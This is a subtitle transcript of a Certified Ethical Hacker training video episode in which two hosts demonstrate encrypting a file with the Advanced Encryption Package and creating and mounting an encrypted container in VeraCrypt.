that.\n\n787\n00:37:32.410 --> 00:37:35.450\nReally good look there at some\nof those encryption algorithms.\n\n788\n00:37:35.450 --> 00:37:37.860\nWe talked about blocking stream cyphers,\nand\n\n789\n00:37:37.860 --> 00:37:42.590\nwe took a look at an example of\nhashing there at the very end.\n\n790\n00:37:42.590 --> 00:37:44.210\nSo we appreciate all of that,\n\n791\n00:37:44.210 --> 00:37:46.470\nI hope everyone out there\nenjoyed watching this one.\n\n792\n00:37:46.470 -->

00:00:17.148\nI'm your host, Mike Rodrick,\n\n4\n00:00:17.148 --> 00:00:20.160\nand today we're doing\nCertified Ethical Hacker, version 9.\n\n5\n00:00:20.160 --> 00:00:21.880\nAnd specifically in this episode,\n\n6\n00:00:21.880 --> 00:00:26.400\nwe're gonna continue our thought\nprocess along with cryptography.\n\n7\n00:00:26.400 --> 00:00:29.190\nAnd we're actually gonna take\na look at applying some of\n\n8\n00:00:29.190 --> 00:00:32.090\nthe things we've been talking\nabout in the previous episodes.\n\n9\n00:00:32.090 --> 00:00:34.110\nAnd here to help us with\nthat is Mr Adam Gordon.\n\n10\n00:00:34.110 --> 00:00:34.840\nHow you doing Adam?\n\n11\n00:00:34.840 --> 00:00:37.248\n>> Good, so\nessentially we're going to look at applied\n\n12\n00:00:37.248 --> 00:00:38.493\ncryptography-\n>> We are.\n\n13\n00:00:38.493 --> 00:00:40.073\n>> Is what you're suggesting-\n>> [LAUGH]\n\n14\n00:00:40.073 --> 00:00:41.103\n>> We should write a book with that name,\n\n15\n00:00:41.103 --> 00:00:42.431\nthat would actually,\nprobably do really well.\n\n16\n00:00:42.431 --> 00:00:43.432\n>> [LAUGH]\n>> There is one,\n\n17\n00:00:43.432 --> 00:00:44.292\nby the way, in case you didn't know.\n\n18\n00:00:44.292 --> 00:00:46.206\n>> Yeah, written by Mr Adam Gordon?\n\n19\n00:00:46.206 --> 00:00:47.518\n>> No, not by me.\n\n20\n00:00:47.518 --> 00:00:49.366\nNot by me,\nby somebody much more knowledgeable.\n\n21\n00:00:49.366 --> 00:00:52.160\nBut anyway, so\nwe're gonna actually delve in.\n\n22\n00:00:52.160 --> 00:00:55.860\nWe're gonna talk about, and\nshow you at the same time,\n\n23\n00:00:55.860 --> 00:00:58.905\nsome of the things that we've\nactually discussed in prior episodes.\n\n24\n00:00:58.905 --> 00:01:01.695\nMike's been kind enough to\nvolunteer to help me with this one.\n\n25\n00:01:01.695 --> 00:01:03.795\nSo I'm gonna narrate and talk to you.\n\n26\n00:01:03.795 --> 00:01:06.505\nThe hands on the keyboard will\nbe the hands of the lovely\n\n27\n00:01:06.505 --> 00:01:07.455\nMike Rodrick, everybody.\n\n28\n00:01:07.455 --> 00:01:11.810\nAnd so Mike's gonna drive on\nthis particular lab for us.\n\n29\n00:01:11.810 --> 00:01:13.002\nBut what we're gonna do is go in,\n\n30\n00:01:13.002 --> 00:01:15.229\nwe're gonna use our Windows 8\nmachine as we have been using.\n\n31\n00:01:15.229 --> 00:01:18.746\nWe got a little special in store for\nyou here at the end,\n\n32\n00:01:18.746 --> 00:01:23.460\nwe're gonna switch over and\ndo something on the Mac once we get done.\n\n33\n00:01:23.460 --> 00:01:25.410\nMike's gonna take us through\nhow to create a self-signed\n\n34\n00:01:25.410 --> 00:01:26.810\ncertificate there on the Mac.\n\n35\n00:01:26.810 --> 00:01:29.010\nWe always try to throw in\na little variety for you.\n\n36\n00:01:29.010 --> 00:01:30.540\nYou'll mix it up on\nthe different platforms.\n\n37\n00:01:30.540 --> 00:01:32.240\nYou're gonna see, the reality is,\n\n38\n00:01:32.240 --> 00:01:34.990\nas an ethical hacker, you're gonna\nwork a lot in Windows and Linux.\n\n39\n00:01:34.990 --> 00:01:39.715\nWe've spent a lot of time in all of our\nlive kinda demo lab episodes as we go in\n\n40\n00:01:39.715 --> 00:01:44.749\nand do stuff to show you the reality of\nthe knowledge we're giving you in Linux.\n\n41\n00:01:44.749 --> 00:01:47.856\nWe use Kali Linux extensively,\nwe used Windows extensively.\n\n42\n00:01:47.856 --> 00:01:52.030\nAnd you may very well, at certain points,\nhave to operate on the Mac as well.\n\n43\n00:01:52.030 --> 00:01:54.650\nAnd so we're gonna try to bring\nthat to you a little bit and\n\n44\n00:01:54.650 --> 00:01:55.820\njust show you that also.\n\n45\n00:01:55.820 --> 00:01:58.160\nAll right, so\nwe're on the Windows 8 desktop here.\n\n46\n00:01:58.160 --> 00:02:01.884\nWe're gonna open up a tool called\nthe Advanced Encryption Package,\n\n47\n00:02:01.884 --> 00:02:03.260\nit's called AEP.\n\n48\n00:02:03.260 --> 00:02:06.284\nIt's an encryption tool,\nnothing fancy, you can download it.\n\n49\n00:02:06.284 --> 00:02:09.750\nIt's got a 30 day free trial associated\nwith it, that's what we're using.\n\n50\n00:02:09.750 --> 00:02:12.070\nYou can license it if you want\nto actually use it formally.\n\n51\n00:02:12.070 --> 00:02:16.850\nWhat we're gonna do is essentially open up\nthe file system, so we have the C drive,\n\n52\n00:02:16.850 --> 00:02:18.700\nthe D drive,\nall of the volumes that are mounted.\n\n53\n00:02:18.700 --> 00:02:20.764\nWe've just gone ahead and\nexploded that out.\n\n54\n00:02:20.764 --> 00:02:24.922\nWe've opened up the hierarchy into\nthe user profile, into the user account,\n\n55\n00:02:24.922 --> 00:02:28.577\ninto the desktop so we're on\nthe desktop of the active user, right.\n\n56\n00:02:28.577 --> 00:02:29.264\n>> Mm-hm.\n\n57\n00:02:29.264 --> 00:02:32.149\n>> And we're gonna go in and\nwe have created a folder, or\n\n58\n00:02:32.149 --> 00:02:35.434\nMike will create a new one for\nus, we have one that's there.\n\n59\n00:02:35.434 --> 00:02:37.980\nBut Mike will just right,\ngo ahead and right-click and\n\n60\n00:02:37.980 --> 00:02:39.290\ncreate a new one if you want.\n\n61\n00:02:39.290 --> 00:02:41.462\n>> Just make a new file\ninside that folder there?\n\n62\n00:02:41.462 --> 00:02:43.275\n>> Either way.\nOkay, so we'll go ahead and\n\n63\n00:02:43.275 --> 00:02:46.454\nwe'll create a new text file inside\nthe folder called Encrypt Me,\n\n64\n00:02:46.454 --> 00:02:48.180\nI think is what I called it, right.\n\n65\n00:02:48.180 --> 00:02:51.553\nSo we're gonna have a little file\nthere that Mike's gonna create,\n\n66\n00:02:51.553 --> 00:02:53.631\na Notepad file called Encrypt Me as well?\n\n67\n00:02:53.631 --> 00:02:54.814\n>> Mm-hm, it is.\n\n68\n00:02:54.814 --> 00:02:56.365\n>> All right, so you could right-click,\n\n69\n00:02:56.365 --> 00:02:58.748\njust show them how you would\ncreate a folder if you wanted to.\n\n70\n00:02:58.748 --> 00:03:01.086\n>> Sure, yep [CROSSTALK].\n>> You can just right-click anywhere up on\n\n71\n00:03:01.086 --> 00:03:04.721\nthe desktop or anywhere, and you'll see\nyou have a new file creation option,\n\n72\n00:03:04.721 --> 00:03:06.190\nright, so we can do that.\n\n73\n00:03:06.190 --> 00:03:07.220\nSo we've created it.\n\n74\n00:03:07.220 --> 00:03:10.150\nAnd then once we've done that,\ndo we have the file selected in there?\n\n75\n00:03:10.150 --> 00:03:11.379\n>> Mm-hm.\n>> We should be able to see\n\n76\n00:03:11.379 --> 00:03:12.053\nit, so-\n>> There it is.\n\n77\n00:03:12.053 --> 00:03:13.370\n>> We just open it up, highlight it.\n\n78\n00:03:13.370 --> 00:03:16.370\nAnd then once we've done that, we have\nsome options off to the right there.\n\n79\n00:03:16.370 --> 00:03:20.590\nWe've got a group of six buttons at\nthe top, we can encrypt and decrypt,\n\n80\n00:03:20.590 --> 00:03:25.140\nwe can ZIP it, we can delete it,\nwe can email, right?\n\n81\n00:03:25.140 --> 00:03:29.020\nSo we're gonna focus on the Encrypt\noption, so Mike's selected that button.\n\n82\n00:03:29.020 --> 00:03:34.360\nAnd we have two options for\nencrypt, Password or Public Key.\n\n83\n00:03:34.360 --> 00:03:35.490\nAnd when we select Public Key,\n\n84\n00:03:35.490 --> 00:03:38.380\njust to show them what would happen,\nnotice the interface changes.\n\n85\n00:03:38.380 --> 00:03:40.160\nWe have to have a public key file path so\n\n86\n00:03:40.160 --> 00:03:42.610\nwe have to have the public\nkey available to use.\n\n87\n00:03:42.610 --> 00:03:45.130\nAnd then we can specify the algorithm.\n\n88\n00:03:45.130 --> 00:03:46.310\nAnd if we pull down that list,\n\n89\n00:03:46.310 --> 00:03:49.650\nyou'll see that we have quite a large\nnumber of algorithms available there.\n\n90\n00:03:49.650 --> 00:03:52.490\nSome of the ones we've talked about,\nmany others that we have not.\n\n91\n00:03:52.490 --> 00:03:54.290\nBut there's quite a number\nof them in there.\n\n92\n00:03:54.290 --> 00:03:57.890\nI see some RC, I see,\nwhat else do I see there, GOST,\n\n93\n00:03:57.890 --> 00:04:00.462\nI see a bunch of different ones there.\n\n94\n00:04:00.462 --> 00:04:03.087\n>> You got your Skipfish and Twofish and\nBluefish [CROSSTALK] [LAUGH]\n\n95\n00:04:03.087 --> 00:04:03.871\n>> Okay, all right, so\n\n96\n00:04:03.871 --> 00:04:06.390\nSkipjack and all that kinda stuff's there,\nokay, great.\n\n97\n00:04:06.390 --> 00:04:08.540\nSo we're gonna go to Password,\n\n98\n00:04:08.540 --> 00:04:11.830\ncuz we'll use just a simple encryption\nthought process with a password.\n\n99\n00:04:11.830 --> 00:04:13.290\nSo Mike's gonna type in a password.\n\n100\n00:04:13.290 --> 00:04:15.720\nWhatever the password is,\nit doesn't really matter what.\n\n101\n00:04:15.720 --> 00:04:19.830\nHe'll put one in and as he types you\ncould see that the characters are-\n\n102\n00:04:19.830 --> 00:04:20.759\n>> Let's do a better one than that\n\n103\n00:04:20.759 --> 00:04:22.830\n[CROSSTALK]\n>> Yeah, it's yelling at you in red.\n\n104\n00:04:22.830 --> 00:04:26.970\nDo alphanumeric at a minimum,\ndo at least like six or seven characters.\n\n105\n00:04:26.970 --> 00:04:33.615\nAnd so, once he's done that,\nthen we will be ready to do an encryption.\n\n106\n00:04:33.615 --> 00:04:37.600\nWe could choose the algorithm we\nwould like to have available to us.\n\n107\n00:04:37.600 --> 00:04:39.700\nAgain, you make a choice,\ndoesn't matter what.\n\n108\n00:04:39.700 --> 00:04:43.240\nAnd then at the bottom there you'll\nsee we can the Encrypt Now button.\n\n109\n00:04:43.240 --> 00:04:44.241\nKinda hard to miss that, right?\n\n110\n00:04:44.241 --> 00:04:44.825\n>> It is [LAUGH].\n\n111\n00:04:44.825 --> 00:04:48.444\n>> And once that's done, we get a copy\nof that file that is encrypted,\n\n112\n00:04:48.444 --> 00:04:50.345\nit's got a little key icon there.\n\n113\n00:04:50.345 --> 00:04:56.465\nEncryptMe.txt.aep, which is the extension\nfor the encryption in the program.\n\n114\n00:04:56.465 --> 00:04:59.195\nAnd then if we go and take a look,\nwe see that that file file is there.\n\n115\n00:04:59.195 --> 00:05:02.322\nIf we try to open that file,\njust double-click to open it,\n\n116\n00:05:02.322 --> 00:05:04.570\nyou'll see it tries to launch the tool.\n\n117\n00:05:04.570 --> 00:05:08.530\nSo we have to have the tool to decrypt\nit and if we try to open the unencrypted\n\n118\n00:05:08.530 --> 00:05:11.810\nversion, you'll see the unencrypted\nversion opens up just fine.\n\n119\n00:05:11.810 --> 00:05:14.160\nSo we can encrypt\nthe file using this tool.\n\n120\n00:05:14.160 --> 00:05:18.800\nWe could then safely send the file\nto somebody, or store it.\n\n121\n00:05:18.800 --> 00:05:22.310\nThis is really meant more for\nprobably local storage, and\n\n122\n00:05:22.310 --> 00:05:24.710\nthen being able to unencrypt\nwith access to the tool.\n\n123\n00:05:24.710 --> 00:05:27.010\nBut if we were to email\nthe file in encrypted form,\n\n124\n00:05:27.010 --> 00:05:30.240\nwhich we could easily do, what would\nthen have to happen is somebody would\n\n125\n00:05:30.240 --> 00:05:33.010\nhave to have the tool on\nthe other side installed.\n\n126\n00:05:33.010 --> 00:05:35.140\nAnd then we'd also have to\nprovide them the password or\n\n127\n00:05:35.140 --> 00:05:36.950\nthe key, in order to decrypt.\n\n128\n00:05:36.950 --> 00:05:39.610\nSo pretty standard for\nwhat we were talking about.\n\n129\n00:05:39.610 --> 00:05:41.914\nGot our Sally and, rather Alice and Bob.\n\n130\n00:05:41.914 --> 00:05:43.890\n>> Alice and Bob.\n>> I'm thinking about Sally the user.\n\n131\n00:05:43.890 --> 00:05:46.590\nAlice and Bob motif going on here.\n\n132\n00:05:46.590 --> 00:05:49.650\nBut this is how we may very\nwell bring encryption to life,\n\n133\n00:05:49.650 --> 00:05:54.200\nusing an encryption application that will\nsupport the use of encryption, right.\n\n134\n00:05:54.200 --> 00:05:56.100\nSo that's one thing we can look at.\n\n135\n00:05:56.100 --> 00:05:58.796\nAnother interesting tool that we can\nlook at, we can minimize that and\n\n136\n00:05:58.796 --> 00:06:01.591\ngo to VeraCrypt, yeah, the one just\nto the right there, right, yeah.\n\n137\n00:06:01.591 --> 00:06:04.706\nYou may wanna just make that full size or\na little bit bigger, just so you can see.\n\n138\n00:06:04.706 --> 00:06:07.461\nVeraCrypt is going to\nallow us to go in and\n\n139\n00:06:07.461 --> 00:06:10.875\ncreate an encrypted volume\ninside of the system.\n\n140\n00:06:10.875 --> 00:06:14.415\nAnd then use that to be able to\nstore encrypted information, right?\n\n141\n00:06:14.415 --> 00:06:15.520\n>> Mm-hm.\n\n142\n00:06:15.520 --> 00:06:17.055\n>> So what we can do is we can go in,\n\n143\n00:06:17.055 --> 00:06:20.770\nwe're just gonna walk you through\nquickly the idea of how to do this.\n\n144\n00:06:20.770 --> 00:06:24.950\nSo we're gonna open up\nthe tool as Mike has done.\n\n145\n00:06:24.950 --> 00:06:28.690\nWe're going to highlight a drive letter,\n\n146\n00:06:28.690 --> 00:06:32.280\nhow about one we're not using like I or\nsomething like that or whatever?\n\n147\n00:06:32.280 --> 00:06:35.790\nAnd then you'll see at the bottom,\nbelow that there's a Create Volume button.\n\n148\n00:06:35.790 --> 00:06:38.660\nJust underneath the window up on\nthe left there, Create Volume button.\n\n149\n00:06:38.660 --> 00:06:39.960\nSo we're gonna go ahead and click that.\n\n150\n00:06:39.960 --> 00:06:43.960\nWe get the VeraCrypt Volume\nCreation Wizard as we can see.\n\n151\n00:06:43.960 --> 00:06:47.690\nWe're gonna select the Create\nan encrypted file container,\n\n152\n00:06:47.690 --> 00:06:49.280\nshould be the top one by default.\n\n153\n00:06:49.280 --> 00:06:51.030\nBut notice before we click away,\n\n154\n00:06:51.030 --> 00:06:54.290\nEncrypt a non-system\npartition/drive is an option there.\n\n155\n00:06:54.290 --> 00:06:56.948\nAlso Encrypt the system partition or\nentire system disk.\n\n156\n00:06:56.948 --> 00:07:00.970\nIf we wannna do a whole system, whole\nsystem disk, or whole disk encryption,\n\n157\n00:07:00.970 --> 00:07:02.840\nVeraCrypt is a tool that\nwill let us do that.\n\n158\n00:07:02.840 --> 00:07:08.236\nSo we could, like BitLocker, essentially,\nbut outside the OS, as a third party,\n\n159\n00:07:08.236 --> 00:07:13.564\nimplement whole drive or whole instance\nencryption using a non built-in OS tool.\n\n160\n00:07:13.564 --> 00:07:15.520\nAnd that's what VeraCrypt will let us do.\n\n161\n00:07:15.520 --> 00:07:18.540\nSo we're gonna do Create\nan encrypted file container.\n\n162\n00:07:18.540 --> 00:07:21.630\nWe're gonna go ahead and click Next\nthere so make sure that's there.\n\n163\n00:07:21.630 --> 00:07:22.450\nAnd then what do we have?\n\n164\n00:07:22.450 --> 00:07:25.825\nWe have the Standard VeraCrypt volume,\nright?\n\n165\n00:07:25.825 --> 00:07:27.692\nAnd/or the Hidden VeraCrypt volume.\n\n166\n00:07:27.692 --> 00:07:31.212\nRight, so if we do standard, what we can\ndo is wanna be able to create a normal\n\n167\n00:07:31.212 --> 00:07:33.532\nVeraCrypt volume that\nwill essentially be seen.\n\n168\n00:07:33.532 --> 00:07:38.026\nIf we wanna do the hidden one, we may\nactually want to be able to do that and\n\n169\n00:07:38.026 --> 00:07:41.190\nhide it so\npeople don't know that it's there.\n\n170\n00:07:41.190 --> 00:07:42.330\n>> Right.\n>> So they can't see it.\n\n171\n00:07:42.330 --> 00:07:44.802\n>> They can't do the rubber hose on you\ncuz they don't even know it's there.\n\n172\n00:07:44.802 --> 00:07:49.104\n>> Well, they may, right,\nthey wouldn't know to ask like, hey,\n\n173\n00:07:49.104 --> 00:07:52.244\ndid you hide something,\nthey wouldn't know.\n\n174\n00:07:52.244 --> 00:07:56.426\nBut the reality is we won't reveal\nthe password to the volume and\n\n175\n00:07:56.426 --> 00:07:59.220\nbe able to know that it's available to us.\n\n176\n00:07:59.220 --> 00:08:01.050\nSo we'll do standard VeraCrypt volume.\n\n177\n00:08:01.050 --> 00:08:03.270\nWe'll do the standard one,\njust click Next.\n\n178\n00:08:03.270 --> 00:08:06.880\nSo it's gonna ask us, hey,\nwhere do you wanna put this thing, right?\n\n179\n00:08:06.880 --> 00:08:10.140\nSo click Select File, right?\n\n180\n00:08:10.140 --> 00:08:15.580\nAnd what we're gonna do there is\nwe're gonna go ahead and we're going\n\n181\n00:08:15.580 --> 00:08:19.650\nto just put it to the desktop, just make\nit simple so we know where to find it.\n\n182\n00:08:19.650 --> 00:08:21.900\nJust put it up on the desktop,\nno big deal.\n\n183\n00:08:21.900 --> 00:08:24.420\nAnd then what we're gonna do Is,\n\n184\n00:08:24.420 --> 00:08:28.950\nwe're gonna go ahead we're give it a name,\nI'll just call it Mike1.\n\n185\n00:08:28.950 --> 00:08:31.000\nJust the name of the volume\nwhat ever we are gonna call it.\n\n186\n00:08:31.000 --> 00:08:34.230\nObviously in the real world you would call\nit something more meaningful than that,\n\n187\n00:08:34.230 --> 00:08:36.570\nwhatever you want to call it,\nbut that's up to you.\n\n188\n00:08:36.570 --> 00:08:40.150\nThen just click Save, [COUGH] pardon me.\n\n189\n00:08:40.150 --> 00:08:43.248\nNow we're back in the volume\nlocation item, right?\n\n190\n00:08:43.248 --> 00:08:44.570\nThen we're gonna be able to click Next,\n\n191\n00:08:44.570 --> 00:08:47.120\ngot the path there now\nobviously as you can see.\n\n192\n00:08:47.120 --> 00:08:49.660\nAnd notice, by the way,\ncan you hit Back for just one second?\n\n193\n00:08:49.660 --> 00:08:50.850\nI meant to talk about this.\n\n194\n00:08:50.850 --> 00:08:53.240\nNotice the check box there,\nNever save history, right?\n\n195\n00:08:53.240 --> 00:08:56.597\nIt's gonna wipe out the information\nabout doing this after we're done, so\n\n196\n00:08:56.597 --> 00:08:57.970\nthat's kind of interesting.\n\n197\n00:08:57.970 --> 00:09:00.728\nSo click Next, right?\n\n198\n00:09:00.728 --> 00:09:02.785\nAnd then we have the encryption options,\n\n199\n00:09:02.785 --> 00:09:05.147\nso we can choose all sorts\nof algorithms there.\n\n200\n00:09:05.147 --> 00:09:09.531\nWe could do AES we could do SHA\nwe could do all sorts of stuff.\n\n201\n00:09:09.531 --> 00:09:13.500\nSo we have AES there and\nwe have the hash algorithm SHA-512.\n\n202\n00:09:13.500 --> 00:09:16.800\nYou'll see we have a little\ntest option there.\n\n203\n00:09:16.800 --> 00:09:21.740\nSo hit Test and you'll see it goes out,\nshows us the cipher and\n\n204\n00:09:21.740 --> 00:09:25.720\nshows us the key and\nshows us the different options, right?\n\n205\n00:09:25.720 --> 00:09:28.160\nSo we could see what\nwould be happening there.\n\n206\n00:09:28.160 --> 00:09:35.100\nAnd we're going to go ahead and\nyou could just hit Close there, whatever.\n\n207\n00:09:35.100 --> 00:09:37.720\nYeah, you could just hit Close, right,\njust to show what it would look like.\n\n208\n00:09:37.720 --> 00:09:39.200\nWe obviously know that it will work.\n\n209\n00:09:39.200 --> 00:09:40.750\nAll right, so then we're to click Next,\n\n210\n00:09:40.750 --> 00:09:43.930\nwe get our volume size,\nwe specify how big it is.\n\n211\n00:09:43.930 --> 00:09:47.244\nWe're not going to go big here,\nbecause clearly it's on the desktop,\n\n212\n00:09:47.244 --> 00:09:51.410\nwe'll keep it in megabytes, so, do 10\nmegs or two megs, or something like that.\n\n213\n00:09:51.410 --> 00:09:55.750\nBut notice we have kilobytes,\nmegabytes, we have gigabytes,\n\n214\n00:09:55.750 --> 00:09:57.210\nterabytes as well, right?\n\n215\n00:09:57.210 --> 00:09:59.990\nNewer version of the product\nhas the terabytes size so\n\n216\n00:09:59.990 --> 00:10:03.380\nit's obviously gonna be able to do\nsome pretty hefty volumes there.\n\n217\n00:10:03.380 --> 00:10:05.250\nAnd then when you click Next, right?\n\n218\n00:10:05.250 --> 00:10:08.790\nWe're going to be able to put in\nthe password, I'll let Mike choose what he\n\n219\n00:10:08.790 --> 00:10:12.170\nwants to put there, whatever it\nwill be just remember what it is.\n\n220\n00:10:12.170 --> 00:10:13.804\nSo now we got some options there, right?\n\n221\n00:10:13.804 --> 00:10:18.171\nYou see we can use key files,\nwe can display password, use a PIM,\n\n222\n00:10:18.171 --> 00:10:22.157\nwe can do different things,\ndepending on what we wanna do.\n\n223\n00:10:22.157 --> 00:10:24.887\nAnd then when we're done,\nwe'll click Next,\n\n224\n00:10:24.887 --> 00:10:27.150\nwe get a little warning there, right?\n\n225\n00:10:27.150 --> 00:10:33.290\nIt says, hey, do you wanna use\nthis with the short password,\n\n226\n00:10:33.290 --> 00:10:36.250\nbecause it's saying, hey, your password's\nshort, it may be brute forcible.\n\n227\n00:10:36.250 --> 00:10:37.110\nBut, that's okay.\n\n228\n00:10:37.110 --> 00:10:38.220\nWe're not really doing this for real.\n\n229\n00:10:38.220 --> 00:10:39.360\nWe're just doing it to show you.\n\n230\n00:10:39.360 --> 00:10:42.550\nClick Yes, that's fine and\nthen we have to format,\n\n231\n00:10:42.550 --> 00:10:46.830\nyou'll see there it's going through and\nis if you look at the bottom there, right?\n\n232\n00:10:46.830 --> 00:10:48.070\nIt's going through and\n\n233\n00:10:48.070 --> 00:10:51.180\ntake a look at what's gonna happen,\ndid you know how our system work?\n\n234\n00:10:51.180 --> 00:10:55.090\n>> No, I didn't select it.\n\n235\n00:10:55.090 --> 00:10:56.090\n>> Yes that's it.\n\n236\n00:10:56.090 --> 00:10:58.650\n>> Okay,\n>> It says\n\n237\n00:10:58.650 --> 00:11:02.200\nrandomness collected from mouse movement,\nso as I'm moving my mouse around,\n\n238\n00:11:02.200 --> 00:11:04.280\nyou see it goes a little\nbit faster up there.\n\n239\n00:11:04.280 --> 00:11:08.570\n>> And then if you go zig zag up and\ndown like crazy kind of stuff and\n\n240\n00:11:08.570 --> 00:11:09.955\ndo all sorts of crazy things.\n\n241\n00:11:09.955 --> 00:11:15.660\nSo it's using that to essentially be able\nto figure out how to generate the key.\n\n242\n00:11:15.660 --> 00:11:17.590\nWhich is kinda cool, right?\n\n243\n00:11:17.590 --> 00:11:21.780\nSo it's doing that for us, so Michael,\nfinish spiraling, wax on, wax off.\n\n244\n00:11:21.780 --> 00:11:22.680\n>> Right?\n\n245\n00:11:22.680 --> 00:11:24.678\n>> Right?\n>> [LAUGH]\n\n246\n00:11:24.678 --> 00:11:25.900\n>> Show me wax on,\n\n247\n00:11:25.900 --> 00:11:29.600\nshow me vax off, show me paint the car,\nshow me paint the fence.\n\n248\n00:11:29.600 --> 00:11:31.230\nRight?\nShow me side to side.\n\n249\n00:11:31.230 --> 00:11:32.380\nRight?\n\n250\n00:11:32.380 --> 00:11:33.540\nMr Miyagi was cool.\n\n251\n00:11:33.540 --> 00:11:34.430\nAll right.\nSo,\n\n252\n00:11:35.610 --> 00:11:40.890\nanother movie they totally screwed up when\nthey did the 4,000 additional iterations.\n\n253\n00:11:40.890 --> 00:11:44.580\nThe first one was like awesome,\nthe last one was just, you know.\n\n254\n00:11:44.580 --> 00:11:46.060\nYou gotta know when to quit, right?\n\n255\n00:11:46.060 --> 00:11:46.560\n>> Yep.\nAll right,\n\n256\n00:11:46.560 --> 00:11:49.460\nwell I think I'm gonna quit because\nit looks like our green bar is full.\n\n257\n00:11:49.460 --> 00:11:53.790\nYes, so then you could do format, right?\n\n258\n00:11:53.790 --> 00:11:57.604\nAnd then, let it do it's thing there, okay\nas you see it went through pretty quick,\n\n259\n00:11:57.604 --> 00:11:59.233\nit's been successfully created.\n\n260\n00:11:59.233 --> 00:12:02.410\nRemember it's such a small volume so\nit can't take too long.\n\n261\n00:12:02.410 --> 00:12:05.400\nSo click OK, click Next there or\nExit rather.\n\n262\n00:12:05.400 --> 00:12:06.140\n>> Great yep.\n>> I'm sorry yeah\n\n263\n00:12:06.140 --> 00:12:08.450\nwe don't want to do another one I\nmeant exit just cancel that's fine.\n\n264\n00:12:08.450 --> 00:12:12.940\nAnd then if you go in you should see down\nthere on the desktop somewhere I can't see\n\n265\n00:12:12.940 --> 00:12:16.850\nwhere it is cuz I'm not there it is right\nokay you should see the volume, right?\n\n266\n00:12:16.850 --> 00:12:22.710\nAnd we should see it's a 10 meg file and\ngo into the Windows Explorer.\n\n267\n00:12:22.710 --> 00:12:25.320\nSo go in the file explorers down there,\nyou can probably open it up.\n\n268\n00:12:25.320 --> 00:12:29.410\nAnd do you see it's not\nmounted as a file system item.\n\n269\n00:12:29.410 --> 00:12:31.720\nYou see it's not sitting there,\nit's like a drive.\n\n270\n00:12:31.720 --> 00:12:34.470\nYou see it is sitting there as a file,\nright?\n\n271\n00:12:34.470 --> 00:12:36.910\nSo if you want to try to open it, right?\n\n272\n00:12:36.910 --> 00:12:39.450\nWhat you have to do if you click on it,\nit doesn't associate with anything.\n\n273\n00:12:39.450 --> 00:12:41.370\nYou have to have the tool\nto be able to use it.\n\n274\n00:12:41.370 --> 00:12:42.510\n>> Okay.\n>> So again,\n\n275\n00:12:42.510 --> 00:12:48.020\nyou'd have to then be able to go in and\nyou would have to be able to\n\n276\n00:12:48.020 --> 00:12:53.740\nuse the tool to mount that volume and\nactually be able to see it.\n\n277\n00:12:53.740 --> 00:12:56.610\nSo, if you go back into the tool,\nso bring back up VeraCrypt.\n\n278\n00:12:56.610 --> 00:12:57.750\nWell actually did you close the Edge.\n\n279\n00:12:57.750 --> 00:12:59.070\n>> Yeah, it's thinking about it here.\n\n280\n00:12:59.070 --> 00:13:00.280\n>> Just give it a sec and it'll come up.\n\n281\n00:13:00.280 --> 00:13:00.870\nThere we go.\n>> There we go.\n\n282\n00:13:00.870 --> 00:13:03.900\n>> So now we have to actually go and\nselect the file to be able to do that.\n\n283\n00:13:03.900 --> 00:13:06.016\nSo you see where it says select file?\n\n284\n00:13:06.016 --> 00:13:07.359\n>> Right?\nSo select file.\n\n285\n00:13:07.359 --> 00:13:10.318\nYou have to go and\nfind it wherever it is there, right?\n\n286\n00:13:10.318 --> 00:13:15.060\n>> Desktop and somewhere down here.\n\n287\n00:13:15.060 --> 00:13:15.972\nMic one.\n\n288\n00:13:15.972 --> 00:13:16.760\n>> All right.\n\n289\n00:13:16.760 --> 00:13:17.841\n>> And then we click open.\n\n290\n00:13:17.841 --> 00:13:18.935\n>> We have to select\nassociated drive letter.\n\n291\n00:13:18.935 --> 00:13:20.815\nWhether you're gonna use I or whatever.\n\n292\n00:13:20.815 --> 00:13:22.455\nIt doesn't matter, right?\n\n293\n00:13:22.455 --> 00:13:25.625\nSo we're gonna do that and\nthen once we've done that\n\n294\n00:13:27.745 --> 00:13:32.190\nwe are going to go in and\nyeah click mount, right?\n\n295\n00:13:32.190 --> 00:13:35.250\nOkay, and then you're gonna be\nasked to provide the password.\n\n296\n00:13:35.250 --> 00:13:37.140\nYou enter it what it was whatever it was.\n\n297\n00:13:38.400 --> 00:13:38.940\n>> Right?\n\n298\n00:13:38.940 --> 00:13:45.162\n>> And then click OK give it\na second it's gotta read it.\n\n299\n00:13:45.162 --> 00:13:45.730\nDid it go through?\n\n300\n00:13:45.730 --> 00:13:47.270\n>> There it is.\n\n301\n00:13:47.270 --> 00:13:48.975\n>> Okay, good.\nSo, you can see it now, right?\n\n302\n00:13:48.975 --> 00:13:50.000\n>> Mm-hm.\n>> All right, good.\n\n303\n00:13:50.000 --> 00:13:52.690\nSo now,\nwe should be able to use it if we want to.\n\n304\n00:13:52.690 --> 00:13:54.600\n>> Go to File Explorer, and there it is.\n\n305\n00:13:54.600 --> 00:13:55.250\nIsn't that cool?\n\n306\n00:13:55.250 --> 00:13:57.140\n>> And you can go in and you can use it.\n\n307\n00:13:57.140 --> 00:14:00.410\n>> So once we mount it, we're able to\nuse it, create stuff, do whatever.\n\n308\n00:14:00.410 --> 00:14:02.280\nBut it's stored in the encrypted volume.\n\n309\n00:14:02.280 --> 00:14:03.830\n>> Very cool.\n>> So as a result.\n\n310\n00:14:03.830 --> 00:14:06.530\nWhen we then unmounted,\nit's just the file,\n\n311\n00:14:06.530 --> 00:14:08.630\nnobody knows in theory that it's there.\n\n312\n00:14:08.630 --> 00:14:09.250\nIf they do see,\n\n313\n00:14:09.250 --> 00:14:11.700\nif they don't know how to use it\nunless they have the tool to mount it.\n\n314\n00:14:11.700 --> 00:14:16.410\nSo it provides a secure container for\nus to save our information and\n\n315\n00:14:16.410 --> 00:14:17.550\nto do so securely.\n\n316\n00:14:17.550 --> 00:14:19.388\nWhen we're done we can dismount.\n\n317\n00:14:19.388 --> 00:14:22.879\nYou could actually highlight that, if you\njust wanna show them you can highlight and\n\n318\n00:14:22.879 --> 00:14:23.380\ndismount.\n\n319\n00:14:23.380 --> 00:14:25.500\nAnd then you should be able to.\n\n320\n00:14:25.500 --> 00:14:27.770\nIt's already gone, it's already gone,\nyou dismounted it.\n\n321\n00:14:27.770 --> 00:14:29.230\n>> I did?\nSo we go back in here, and\n\n322\n00:14:29.230 --> 00:14:30.070\nit's no longer there.\n\n323\n00:14:30.070 --> 00:14:31.510\n>> Yep.\n\n324\n00:14:31.510 --> 00:14:32.264\n>> Beautiful.\n\n325\n00:14:32.264 --> 00:14:35.015\n>> All right, so that's how we\nwould create an encrypted 